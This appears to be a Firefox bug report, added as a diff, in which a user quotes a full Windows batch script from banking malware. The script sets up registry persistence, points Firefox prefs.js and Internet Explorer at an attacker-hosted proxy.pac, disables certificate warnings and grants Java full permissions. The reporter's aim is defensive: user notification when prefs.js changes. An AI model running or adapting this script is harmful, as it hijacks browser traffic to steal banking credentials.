@@ -1,0 +1,66 @@
+Firefox is a virus target
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)
+Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)
+
+I have checked that Firefox is a virus target.
+The virus change proxy setting to redirect all conections to a external proxy, capturing all bank information:
+
+@shift
+::@echo off
+@break off
+
+if exist %temp%\iecfg.dll goto con
+::add to regedit
+> %temp%\iecfg.dll echo y
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v JavaPlugin /t REG_SZ /d "%temp%\csrrs.exe" < %temp%\iecfg.dll
+start /low /min iexplore.exe "http://adobe.shockwavesfx.com/successful.php"
+goto mapa
+::Connection test
+:con
+set ping=%windir%\system32\ping.exe
+:test
+%ping% 74.125.159.99 -n 1 -l 1 | find "TTL" > nul
+if not errorlevel 1 goto mapa
+goto teste
+:mapa
+::Get IP
+FOR /F "TOKENS=3 delims=: " %%E IN ('%windir%\system32\ping.exe proxy.shockwavesfx.com -n 1 -l 1 ^| find.exe "TTL" ') DO SET ip=%%E
+
+
+
+FOR /F "TOKENS=*" %%E IN ('dir "%HoMePath%\.." /b /s ^| find "prefs.js"') DO %windir%\system32\attrib.exe -r -a -s -h "%%E" && echo user_pref("network.proxy.autoconfig_url", "http://%ip%/proxy.pac"); >> "%%E"
+FOR /F "TOKENS=*" %%E IN ('dir "%HoMePath%\.." /b /s ^| find "prefs.js"') DO %windir%\system32\attrib.exe -r -a -s -h "%%E" && echo user_pref("network.proxy.type", 2); >> "%%E"
+
+
+
+type %temp%\~a.tmp | find.exe "Internet Explorer\Main">%temp%\~b.tmp && for /f "tokens=2 delims=\" %%D in ('type %temp%\~b.tmp ^| find.exe "S-1-5-21"') do set CSL=%%D
+echo y|%windir%\system32\reg.exe add "HKU\%CSL%\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "WarnonBadCertRecving" /t REG_DWORD /d "0x00000000" /f
+
+
+cd %HoMePath%
+::Add Proxy to IE*
+echo Windows Registry Editor Version 5.00 > iecfg.reg
+echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings] >> iecfg.reg
+echo "AutoConfigURL"="http://%ip%/proxy.pac" >> iecfg.reg
+echo "EnableHttp1_1"=dword:00000001 >> iecfg.reg
+echo "ProxyEnable"=dword:00000000 >> iecfg.reg
+echo "ProxyHttp1.1"=dword:00000000 >> iecfg.reg
+regedit /s iecfg.reg
+del iecfg.reg
+
+
+::Allow java applet
+cd %windir%
+cd ..
+FOR /F "TOKENS=*" %%E IN ('dir /b /s ^| find /i "java.policy"') DO echo grant { permission java.security.AllPermission;}; > "%%E"
+:no
+
+::exit
+
+Reproducible: Always
+
+Actual Results:
+Prefs.js is very easy to be changed by a external action.
+
+Expected Results:
+When prefs.js is changed, user need be informed when Firefox run.
